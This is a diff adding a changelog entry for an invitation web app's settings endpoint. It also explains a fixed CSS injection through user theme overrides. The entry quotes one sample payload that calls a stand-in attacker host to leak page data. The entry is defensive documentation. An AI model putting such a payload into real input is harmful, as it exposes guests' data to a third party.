@@ -10,6 +10,22 @@ Format follows Keep a Changelog conventions, grouped by release once releases ex
 
 ## Unreleased
 
+### 2026-09-12 — settings, and a CSS injection that a build guard surfaced
+
+**Added** — `GET`/`PATCH /invitations/:id/settings` ([P1-14](./records/2026-09-12-P1-14-settings-and-slug-rules.md))
+
+- One domain object over two tables (`docs/PLAN/08` § Where Settings Fields Physically Live): `slug` is a column on `invitations` because it is on the public request path, the toggles live on `invitation_settings`, and the service writes to whichever owns the column. Users should not have to know the schema to change a setting.
+- **The boundary rejects rather than silently ignoring.** A section key the template does not define, or a theme key outside `customizable_theme_keys`, is refused — because stored-and-ignored is the failure that looks like success: the API returns 200, the page does not change, and nothing anywhere says why.
+- Validation reads the invitation's **locked** template version, not the template's newest. BR-3.1 locks a version at creation, and using the newest would start rejecting saves on old invitations the moment an admin published a template that dropped a section.
+- A slug change is gated on `published_at IS NULL`, **not** `status != 'published'`. BR-6.2's reason is that old links break, and unpublishing does not un-share the links people already hold.
+- A concurrent slug claim is a **409**, not a 500 — Postgres `23505` caught by code rather than by message.
+
+**Worth knowing** — `theme_override` had validated **keys** and completely unvalidated **values**.
+
+A theme value becomes a **CSS custom property on the public page**, and unlike a template definition — which is admin-authored — an override comes from an end user. `red; background: url(https://evil.test/?c=…)` would have been a CSS injection reaching every guest who opened the invitation. Eight injection shapes are now rejected, reusing `HEX_COLOR` and `CSS_TOKEN` from `@wi/schema` rather than new patterns, so a user's override is held to exactly what a template definition is held to. Removing the check fails eleven tests.
+
+It was found because `check-sanitized-fields` refused the field as unregistered, and writing the exemption reason forced the question *"so what does protect this field, then?"* — at which point the answer was visibly missing. That is `P1-16`'s real value: not catching unsanitized prose, but making somebody state the defence for each field.
+
 ### 2026-09-12 — gift accounts, where the threat is substitution rather than disclosure
 
 **Added** — gift account CRUD and the quote endpoint ([P1-13](./records/2026-09-12-P1-13-gift-accounts-and-quote.md))
